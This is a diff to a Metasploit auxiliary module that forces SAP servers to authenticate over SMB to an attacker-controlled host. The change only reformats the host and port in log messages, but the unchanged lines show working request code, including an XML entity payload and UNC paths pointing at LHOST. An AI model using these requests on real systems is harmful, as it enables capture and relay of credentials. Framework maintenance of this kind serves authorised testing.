@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_xmla
     if !valid_credentials?
-      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP BW service")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Credentials needed in order to abuse the SAP BW service")
       return
     end
 
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     data << '<in>&foo;</in>'
 
     begin
-      print_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request for #{smb_uri}")
       res = send_request_raw({
         'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
         'method' => 'POST',
@@ -105,12 +105,12 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
       })
       if res && (res.code == 200) && res.body =~ /XML for Analysis Provider/ && res.body =~ /Request transfered is not a valid XML/
-        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - SMB Relay looks successful, check your SMB capture machine")
       elsif res
-        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
+        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
       return
     end
   end
@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"
 
     if datastore['HttpUsername'].empty?
-      vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending unauthenticated request for #{smb_uri}")
       res = send_request_cgi({
         'uri' => '/mmr/MMR',
         'method' => 'HEAD',
@@ -133,7 +133,7 @@ class MetasploitModule < Msf::Auxiliary
       })
 
     else
-      vprint_status("#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending authenticated request for #{smb_uri}")
       res = send_request_cgi({
         'uri' => '/mmr/MMR',
         'method' => 'GET',
@@ -149,21 +149,21 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res
-      vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
     end
   rescue ::Rex::ConnectionError
-    print_error("#{rhost}:#{rport} - Unable to connect")
+    print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
     return
   end
 
   def send_soap_rfc_request(data, smb_uri)
     if !valid_credentials?
-      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP SOAP RFC service")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Credentials needed in order to abuse the SAP SOAP RFC service")
       return
     end
 
     begin
-      vprint_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request for #{smb_uri}")
       res = send_request_cgi({
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
@@ -180,12 +180,12 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
       if res && (res.code == 500) && res.body =~ /OPEN_FAILURE/
-        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - SMB Relay looks successful, check your SMB capture machine")
       elsif res
-        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
+        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
       return
     end
   end
